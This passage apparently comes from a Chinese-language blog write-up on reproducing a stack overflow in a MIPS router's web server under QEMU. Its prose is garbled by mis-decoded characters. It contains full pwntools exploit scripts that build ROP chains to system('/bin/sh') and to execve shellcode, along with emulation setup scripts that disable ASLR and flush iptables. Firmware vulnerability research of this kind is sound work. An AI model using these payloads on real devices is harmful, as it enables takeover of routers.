alt="image-20230521145755628"></p><p>åªéœ€è¦ç‚¹ä¸€ä¸‹ <code>search -&gt; mips rop gadgets</code>  å³å¯</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211458582.png" alt="image-20230521145839462"></p><p>èƒ½åŒ¹é…åˆ°å¾ˆå¤šä¸ª <code>gadget</code> ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œæ ¹æ®è‡ªå·±å¸ƒå±€çš„éœ€æ±‚æ¥é€‰æ‹©åˆé€‚çš„å°±å¯ä»¥</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211500301.png" alt="image-20230521150004230"></p><p>å¦‚æœè¦æœå°†æ ˆåœ°å€æ”¾å…¥æŸä¸ªå¯„å­˜å™¨çš„ <code>gadget</code> ï¼Œå¯ä»¥ç”¨ <code>mipsrop.stackfinder()</code> å‘½ä»¤ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211502965.png" alt="image-20230521150247898"></p><p><a href="https://bbs.kanxue.com/thread-272318.htm">winmt</a> å¸ˆå‚…æåˆ° ç”¨æˆ·æ¨¡å¼ä¸æ”¯æŒå¤šçº¿ç¨‹ï¼Œè€Œ <code>system</code> å‡½æ•°ä¼šè°ƒç”¨ <code>fork</code> å‡½æ•°ï¼Œä»è€Œå¯¼è‡´ <code>fork</code> æ‰§è¡Œå¤±è´¥ï¼Œ<code>system</code> æ‰§è¡Œåˆ°è¿™é‡Œåå°±ä¼šå¡ä½ã€‚ä¸è¿‡ä¹‹ååœ¨ç³»ç»Ÿæ¨¡å¼ä¸‹æ˜¯æ²¡é—®é¢˜çš„</p><h6 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc_base=<span class="number">0x3ff38000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x4E0EC =&gt; move $a0,$s1 ; jalr $s0</span></span><br><span class="line"><span class="comment">#0x42f60 =&gt; addiu $a0,$sp,0x18 ;  jalr  $a0 </span></span><br><span class="line"><span class="comment">#0x4683C =&gt; move $a0,$s1  ;  jalr  $s3</span></span><br><span class="line"><span class="comment">#0xB814  =&gt; addiu $a1,$sp,0x18  ;  jalr  $s1 </span></span><br><span class="line"><span class="comment">#0xDEF0  =&gt; addiu $s2,$sp,0x10 ;  jalr  $s4 </span></span><br><span class="line"><span class="comment">#0x3F25C =&gt; jalr $s2</span></span><br><span class="line"><span class="comment">#0x158c8 =&gt; adddiu $s0,1  ; jalr $s5</span></span><br><span class="line"><span class="comment">#0x159cc =&gt; addiu $s5,$sp,0x10 ; move $a1,$a5 ;jalr $s0</span></span><br><span class="line"></span><br><span class="line">sys_addr=libc_base+<span class="number">0x53200</span></span><br><span class="line">payload=<span class="string">b&quot;uid=&quot;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">1007</span></span><br><span class="line"></span><br><span class="line">payload+=p32(sys_addr-<span class="number">1</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x159cc</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xc</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x158c8</span>)</span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&quot;/bin//sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211521976.png" alt="image-20230521152152411" style="zoom:50%;" /><p>ä¸Šé¢çš„ <code>exp</code> æ˜¯å¯ä»¥æ­£å¸¸èµ°åˆ° <code>system</code> å‡½æ•°çš„ï¼Œä½†æ˜¯ <code>a0</code> æ˜¯ <code>/bin//sh/postxml</code> ï¼Œè¿™æ˜¯å› ä¸ºç¬¬ä¸€æ¬¡ <code>sprintf</code> æ‹¼æ¥äº†åé¢çš„å­—ç¬¦ä¸²å¸¸é‡ <code>postxml</code> ã€‚å› ä¸ºåœ°å€å›ºå®šçš„åŸå› ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ <code>libc</code> ä¸­çš„ <code>/bin/sh</code> åœ°å€ EXPå¦‚ä¸‹</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x3ff38000</span></span><br><span class="line">sys_addr=libc_base+<span class="number">0x53200</span></span><br><span class="line">bin_sh_addr=libc_base+<span class="number">0x5a448</span></span><br><span class="line">payload=<span class="string">b&quot;uid=&quot;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">1007</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x4E0EC =&gt; move $a0,$s1 ; jalr $s0</span></span><br><span class="line"><span class="comment">#0x42f60 =&gt; addiu $a0,$sp,0x18 ;  jalr  $a0 </span></span><br><span class="line"><span class="comment">#0x4683C =&gt; move $a0,$s1  ;  jalr  $s3</span></span><br><span class="line"><span class="comment">#0xB814  =&gt; addiu $a1,$sp,0x18  ;  jalr  $s1 </span></span><br><span class="line"><span class="comment">#0xDEF0  =&gt; addiu $s2,$sp,0x10 ;  jalr  $s4 </span></span><br><span class="line"><span class="comment">#0x3F25C =&gt; jalr $s2</span></span><br><span class="line"><span class="comment">#0x158c8 =&gt; adddiu $s0,1  ; jalr $s5</span></span><br><span class="line"><span class="comment">#0x159cc =&gt; addiu $s5,$sp,0x10 ; move $a1,$a5 ;jalr $s0</span></span><br><span class="line"></span><br><span class="line">payload+=p32(sys_addr-<span class="number">1</span>)<span class="comment">#$s0</span></span><br><span class="line">payload+=p32(bin_sh_addr)<span class="comment">#$s1</span></span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0xc</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x4e0ec</span>)<span class="comment">#$s5</span></span><br><span class="line">payload+=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xc</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x158c8</span>)<span class="comment">#$ra</span></span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&quot;/bin/sh;deadbeef;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line">f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211526368.png" alt="image-20230521152651843" style="zoom: 50%;" /><p>å¯ä»¥å‘ç°è¿™æ¬¡æ˜¯æˆåŠŸæ‰§è¡Œåˆ°äº† <code>system(&quot;/bin/sh&quot;)</code> ï¼Œå› ä¸º <code>fork</code> çš„åŸå› ï¼Œä¾ç„¶æ˜¯æ‹¿ä¸åˆ° <code>shell</code></p><h5 id="ROP-ret2shellcode"><a href="#ROP-ret2shellcode" class="headerlink" title="ROP-ret2shellcode"></a>ROP-ret2shellcode</h5><p>æ˜ç™½äº†ä¸Šé¢ <code>ROP</code> çš„æ€æƒ³ï¼Œé‚£ä¹ˆå¸ƒç½® <code>shellcode</code> ä¹Ÿå°±ä¸åœ¨è¯ä¸‹ï¼Œå› ä¸º <code>shellcode</code> èƒ½ç›´æ¥è°ƒç”¨ <code>execve</code> ä»è€Œä¸éœ€è¦å»ä½¿ç”¨ <code>fork</code>ã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ <code>shellcode</code> ä¸­ä¸èƒ½å‡ºç° <code>\x00</code> è¿˜æœ‰ç¼“å­˜ä¸ä¸€è‡´æ€§ï¼ˆæ•°æ®ç¼“å­˜åŒºå’ŒæŒ‡ä»¤ç¼“å­˜åŒºéœ€è¦ä¸€ä¸ªæ—¶é—´æ¥åŒæ­¥ï¼‰ï¼Œå› æ­¤éœ€è¦å…ˆè°ƒç”¨ä¸€ä¸‹ <code>sleep(1)</code> å†å»æ‰§è¡Œ <code>shellcode</code>ã€‚</p><p>è¿™é‡Œè¿˜éœ€è¦æåˆ°ä¸€ç‚¹ï¼Œå¦‚æœç°åœ¨æ‰§è¡Œäº† <code>gadgetA</code> ï¼Œç„¶åè·³è½¬åˆ°äº† <code>sleep(1)</code> å‡½æ•°ï¼Œç­‰å‡½æ•°è¿”å›æ—¶ä¼šå†è·³è½¬åˆ°äº† <code>gadgetA</code>ï¼Œå› æ­¤å¿…é¡»è¦ä¿è¯ <code>gadgetA</code> å›æ¥åä¾ç„¶èƒ½å»è·³è½¬åˆ°æˆ‘ä»¬æŒ‡å®šçš„åœ°å€ï¼Œä»¥æ­¤æ¥ä¿è¯ <code>ROP</code> ä¸é—´æ–­ã€‚</p><p>ç”»äº†ä¸ªæŠ½è±¡çš„å›¾ï¼ˆå¦‚ä¸‹ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305240902843.png" alt="image-20230524090213648" style="zoom: 67%;" /><h6 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h6><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc_base=<span class="number">0x3ff38000</span></span><br><span class="line">sys_addr=libc_base+<span class="number">0x53200</span></span><br><span class="line">bin_sh_addr=libc_base+<span class="number">0x5a448</span></span><br><span class="line">sleep=libc_base+<span class="number">0x56bd0</span></span><br><span class="line">payload=<span class="string">b&quot;uid=&quot;</span>+<span class="string">b&#x27;c&#x27;</span>*(<span class="number">1007</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x4E0EC =&gt; move $a0,$s1 ; jalr $s0</span></span><br><span class="line"><span class="comment">#0x42f60 =&gt; addiu $a0,$sp,0x18 ;  jalr  $a0 </span></span><br><span class="line"><span class="comment">#0x4683C =&gt; move $a0,$s1  ;  jalr  $s3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0xB814  =&gt; addiu $a1,$sp,0x18  ;  jalr  $s1 </span></span><br><span class="line"><span class="comment">#-------------------------</span></span><br><span class="line"><span class="comment">#0xDEF0  =&gt; addiu $s2,$sp,0x10 ;  jalr  $s4 </span></span><br><span class="line"><span class="comment">#0x436D0 =&gt; move $t9,$s3 ; jalr $t9</span></span><br><span class="line"><span class="comment">#0x3F25C =&gt; jalr $s2</span></span><br><span class="line"><span class="comment">#0x57E50 =&gt; li $a0,1 ;  jalr  $s1 </span></span><br><span class="line"><span class="comment">#-------------------------</span></span><br><span class="line"><span class="comment">#0x158c8 =&gt; adddiu $s0,1  ; jalr $s5</span></span><br><span class="line"><span class="comment">#0x159cc =&gt; addiu $s5,$sp,0x10 ; move $a1,$a5 ;jalr $s0</span></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    slti $a2, $zero, -1</span></span><br><span class="line"><span class="string">    li $t7, 0x69622f2f</span></span><br><span class="line"><span class="string">    sw $t7, -12($sp)</span></span><br><span class="line"><span class="string">    li $t6, 0x68732f6e</span></span><br><span class="line"><span class="string">    sw $t6, -8($sp)</span></span><br><span class="line"><span class="string">    sw $zero, -4($sp)</span></span><br><span class="line"><span class="string">    la $a0, -12($sp)</span></span><br><span class="line"><span class="string">    slti $a1, $zero, -1</span></span><br><span class="line"><span class="string">    li $v0, 4011</span></span><br><span class="line"><span class="string">    syscall 0x40404</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)<span class="comment">#$s0</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x436d0</span>)<span class="comment">#$s1</span></span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)<span class="comment">#$s2</span></span><br><span class="line">payload+=p32(sleep)<span class="comment">#$s3</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x3f25c</span>)<span class="comment">#$s4</span></span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)<span class="comment">#$s5</span></span><br><span class="line">payload+=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xc</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x57e50</span>)<span class="comment">#$ra</span></span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)*<span class="number">10</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x3f25c</span>)<span class="comment">#$s4</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0xdef0</span>)<span class="comment">#second return address $ra</span></span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)*<span class="number">4</span></span><br><span class="line">payload+=shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211617086.png" alt="image-20230521161702923"></p><p>å¯ä»¥çœ‹åˆ°è¿™æ¬¡æ˜¯æ‹¿åˆ° <code>shell</code> äº†ã€‚ä¸è¿‡è¿™é‡Œæ‰§è¡Œ <code>execve(&quot;/bin/sh&quot;)</code> æˆåŠŸå…¶å®æ˜¯ä¸€ç§å‡è±¡ï¼Œå› ä¸ºå›ºä»¶ä¸­çš„ <code>/bin/sh</code> é“¾æ¥åˆ°äº† <code>busybox</code> ä¸Šï¼Œè™½ç„¶ <code>busybox</code> æ˜¯é™æ€é“¾æ¥ï¼Œä½†å› ä¸ºå®ƒæ˜¯ <code>MIPS</code> æ¶æ„ï¼Œå¯¼è‡´äº†æˆ‘åœ¨ <code>x64</code> ä¸Šç›´æ¥æ‰§è¡Œæ˜¯å¤±è´¥çš„ã€‚å› æ­¤æˆ‘ä¸Šé¢æ˜¯æŠŠåŸæœ¬çš„ <code>sh</code> ç»™åˆ æ‰ï¼Œæ¢æˆäº†ä¸»æœºè‡ªå¸¦çš„ <code>x64</code> æ¶æ„çš„ <code>sh</code> ï¼ŒåŒæ—¶è¿˜æŠŠç›¸åº”çš„åŠ¨æ€åº“éƒ½æ”¾åˆ°äº†å½“å‰çš„ <code>/lib</code> ä¸‹é¢ï¼Œæ‰ç®—æ‰§è¡ŒæˆåŠŸã€‚ä¸ç„¶ç”¨åŸæœ¬çš„ <code>sh</code> è¿˜æ˜¯æ‰§è¡Œå¤±è´¥ï¼Œè¿™ä¹ˆåšçš„ç›®çš„ä»…ä»…æ˜¯ä¸ºäº†è¯æ˜è¿™ç§æ“ä½œç†è®ºä¸Šæ˜¯å¯ä»¥æ‹¿åˆ° <code>shell</code> çš„ ğŸ˜</p><h3 id="qemu-ç³»ç»Ÿæ¨¡å¼ä¸‹å¤ç°"><a href="#qemu-ç³»ç»Ÿæ¨¡å¼ä¸‹å¤ç°" class="headerlink" title="qemu ç³»ç»Ÿæ¨¡å¼ä¸‹å¤ç°"></a><code>qemu</code> ç³»ç»Ÿæ¨¡å¼ä¸‹å¤ç°</h3><p>åªè¦åœ¨ <code>qemu</code> ç”¨æˆ·æ¨¡å¼ä¸‹èƒ½å¤ç°æˆåŠŸï¼Œå¹¶ä¸”ææ¸…æ¥šåŸç†ï¼Œå…¶å®è¿™ä¸ª <code>qemu</code> ç³»ç»Ÿæ¨¡å¼æçš„å¾ˆå¿«ã€‚é¦–å…ˆå®ç°ä¸€ä¸‹ <code>qemu</code> ä¸å®¿ä¸»æœºçš„é€šä¿¡ï¼Œç„¶åæŠŠ <code>httpd</code> æœåŠ¡å¯èµ·æ¥å°±å¯ä»¥å‘é€æ•°æ®åŒ…ç›´æ¥æ‰“äº†ï¼ˆåœ¨ä¸é‡åˆ°ä»€ä¹ˆå¥‡æ€ªçš„æŠ¥é”™ä¸‹ç¡®å®æ¯”è¾ƒå¿«â€¦ï¼‰</p><p>æˆ‘è¿™é‡Œçš„ç¯å¢ƒæ˜¯ <code>ubuntu 18.04</code> <code>qemu-system-mipsel 7.2.0</code> </p><h4 id="å®ç°å®¿ä¸»æœºä¸-qemu-çš„é€šä¿¡"><a href="#å®ç°å®¿ä¸»æœºä¸-qemu-çš„é€šä¿¡" class="headerlink" title="å®ç°å®¿ä¸»æœºä¸ qemu çš„é€šä¿¡"></a>å®ç°å®¿ä¸»æœºä¸ <code>qemu</code> çš„é€šä¿¡</h4><p>åˆ›å»ºä¸€ä¸ª <code>net.sh</code> è„šæœ¬ï¼Œæˆ‘è¿™é‡Œçš„ç½‘å¡æ˜¯ <code>ens33</code> ï¼Œå¦‚æœæ˜¯ <code>eth0</code>  çš„è¯ï¼Œå°±æŠŠå‡ºç°çš„ <code>ens33</code> æ¢æˆ <code>eth0</code> å³å¯ï¼Œ<code>chmod +x net.sh</code> ç»™æ–‡ä»¶å¯æ‰§è¡Œæƒé™ï¼Œç„¶å <code>./net.sh</code> è¿è¡Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sudo ifconfig eth0 down                 <span class="comment"># é¦–å…ˆå…³é—­å®¿ä¸»æœºç½‘å¡æ¥å£</span></span></span><br><span class="line">sudo brctl addbr br0                     # æ·»åŠ ä¸€åº§åä¸º br0 çš„ç½‘æ¡¥</span><br><span class="line">sudo brctl addif br0 ens33                # åœ¨ br0 ä¸­æ·»åŠ ä¸€ä¸ªæ¥å£</span><br><span class="line">sudo brctl stp br0 off                   # å¦‚æœåªæœ‰ä¸€ä¸ªç½‘æ¡¥ï¼Œåˆ™å…³é—­ç”Ÿæˆæ ‘åè®®</span><br><span class="line">sudo brctl setfd br0 1                   # è®¾ç½® br0 çš„è½¬å‘å»¶è¿Ÿ</span><br><span class="line">sudo brctl sethello br0 1                # è®¾ç½® br0 çš„ hello æ—¶é—´</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     # å¯ç”¨ br0 æ¥å£</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up    # å¯ç”¨ç½‘å¡æ¥å£</span><br><span class="line">sudo dhclient br0                        # ä» dhcp æœåŠ¡å™¨è·å¾— br0 çš„ IP åœ°å€</span><br><span class="line">sudo brctl show br0                      # æŸ¥çœ‹è™šæ‹Ÿç½‘æ¡¥åˆ—è¡¨</span><br><span class="line">sudo brctl showstp br0                   # æŸ¥çœ‹ br0 çš„å„æ¥å£ä¿¡æ¯</span><br></pre></td></tr></table></figure><p>ç„¶åå†æ‰§è¡Œå¦‚ä¸‹å‡ æ¡å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">sudo tunctl -t tap0 -u root              # åˆ›å»ºä¸€ä¸ª tap0 æ¥å£ï¼Œåªå…è®¸ root ç”¨æˆ·è®¿é—®</span><br><span class="line">sudo brctl addif br0 tap0                # åœ¨è™šæ‹Ÿç½‘æ¡¥ä¸­å¢åŠ ä¸€ä¸ª tap0 æ¥å£</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    # å¯ç”¨ tap0 æ¥å£</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure><p>å†ç”¨ä¸‹é¢è¿™ä¸ªè„šæœ¬å¯åŠ¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª <code>mips</code> å†…æ ¸è¿˜æœ‰é•œåƒæ–‡ä»¶ï¼Œä¹‹å‰å¸ˆå‚…ä»¬ä¸Šæ”¾çš„é“¾æ¥å¥½åƒéƒ½å¤±æ•ˆäº†ã€‚è¿™é‡Œæ˜¯æ‰¾ <strong>winmt</strong> å¸ˆå‚…è¦çš„ä¸€ä»½ï¼Œä¸Šä¼ åˆ°ç½‘ç›˜ä¸Šäº†  é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1-qvt7pG0Tr91JKoH2elNdQ?pwd=l04v">https://pan.baidu.com/s/1-qvt7pG0Tr91JKoH2elNdQ?pwd=l04v</a><br>æå–ç ï¼šl04v</p><p>å¦‚æœæ­¤æ—¶ <code>qemu</code> ä¸­çš„ç½‘å¡ <code>eth0</code> æ˜¯æœ‰ <code>ip</code> çš„ï¼Œå¹¶ä¸”èƒ½å¤Ÿ <code>ping</code> é€šå®¿ä¸»æœºçš„ <code>ip</code>ï¼Œé‚£å°±èƒ½è¯´æ˜ <code>qemu</code> å·²ç»èƒ½å’Œå®¿ä¸»æœºè¿›è¡Œé€šä¿¡äº†</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305212333766.png" alt="image-20230521233355276"></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305212334427.png" alt="image-20230521233441258"></p><h4 id="å¯åŠ¨-httpd-æœåŠ¡"><a href="#å¯åŠ¨-httpd-æœåŠ¡" class="headerlink" title="å¯åŠ¨ httpd æœåŠ¡"></a>å¯åŠ¨ <code>httpd</code> æœåŠ¡</h4><p>åœ¨ <code>squashfs-root</code> çš„ä¸Šä¸€çº§ç›®å½•ä¸­ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œ <code>IP</code> æ¢æˆ <code>qemu</code> çš„ã€‚è¿™æ ·å¯ä»¥å®ç°è®¡ç®—æœºè¿œç¨‹ä¹‹é—´çš„æ–‡ä»¶ä¼ è¾“ï¼Œä½œç”¨å°±æ˜¯æŠŠæå–å‡ºæ¥çš„æ–‡ä»¶ç³»ç»Ÿä¼ åˆ° <code>qemu</code> é‡Œé¢</p><p><code>sudo  scp -r ./squashfs-root root@10.214.140.139:/root/squashfs-root</code></p><p>ç„¶ååœ¨ <code>qemu</code> ä¸­çš„ <code>squashfs-root</code> ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª <code>http_conf</code> æ–‡ä»¶</p><p>å†™å…¥ä»¥ä¸‹ä»£ç ï¼ˆç½‘å¡å’Œ <code>IP</code> <code>port</code> è¦æ”¹æˆè‡ªå·±çš„ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">LogGMT On  #å¼€å¯log</span><br><span class="line">ErrorLog /log #logæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections 15</span><br><span class="line">    BufSize 12288</span><br><span class="line">    InputBufSize 4096</span><br><span class="line">    ScriptBufSize 4096</span><br><span class="line">    NumHeaders 100</span><br><span class="line">    Timeout 60</span><br><span class="line">    ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text/html    &#123; html htm &#125;</span><br><span class="line">        text/xml    &#123; xml &#125;</span><br><span class="line">        text/plain    &#123; txt &#125;</span><br><span class="line">        image/gif    &#123; gif &#125;</span><br><span class="line">        image/jpeg    &#123; jpg &#125;</span><br><span class="line">        text/css    &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; /dump &#125;</span><br><span class="line">        CGI            &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; map &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">    ServerName &quot;Linux, HTTP/1.1, &quot;</span><br><span class="line">    ServerId &quot;1234&quot;</span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth0  #å¯¹åº”qemuä»¿çœŸè·¯ç”±å™¨ç³»ç»Ÿçš„ç½‘å¡</span><br><span class="line">    Address 10.214.140.139 #qemuä»¿çœŸè·¯ç”±å™¨ç³»ç»Ÿçš„IP</span><br><span class="line">    Port &quot;80&quot; #å¯¹åº”æœªè¢«ä½¿ç”¨çš„ç«¯å£</span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /</span><br><span class="line">            Location /htdocs/web</span><br><span class="line">            IndexNames &#123; index.php &#125;</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨ç‰©ç†æœºä¸Š <code>/opt/tools/mipsel</code> ç›®å½•ï¼ˆæ²¡æœ‰çš„è¯å°±è‡ªå·±åˆ›å»ºå§ï¼‰ä¸­æ–°å»º <code>init.sh</code> æ–‡ä»¶ï¼Œå†™å…¥å¦‚ä¸‹é…ç½®</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure><p>ç»™è¿™ä¸ª <code>init.sh</code> ï¼Œå¯æ‰§è¡Œæƒé™ï¼Œç„¶åå°†å…¶æ‰§è¡Œ</p><p>ç„¶ååœ¨ <code>qemu</code> ä¸­çš„ <code>squashfs-root</code> ç›®å½•ä¸‹åˆ›å»º <code>init.sh</code> æ–‡ä»¶ï¼Œå†™å…¥ä¸‹é¢çš„å†…å®¹ã€‚ç»™å¯æ‰§è¡Œæƒé™ï¼Œç„¶åæ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">cp http_conf /</span><br><span class="line">cp sbin/httpd /</span><br><span class="line">cp -rf htdocs/ /</span><br><span class="line">mkdir /etc_bak</span><br><span class="line">cp -r /etc /etc_bak</span><br><span class="line">rm /etc/services</span><br><span class="line">cp -rf etc/ /</span><br><span class="line">cp lib/ld-uClibc-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libcrypt-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libc.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so.1  /lib/</span><br><span class="line">cp lib/ld-uClibc.so.0  /lib/</span><br><span class="line">cp lib/libcrypt.so.0  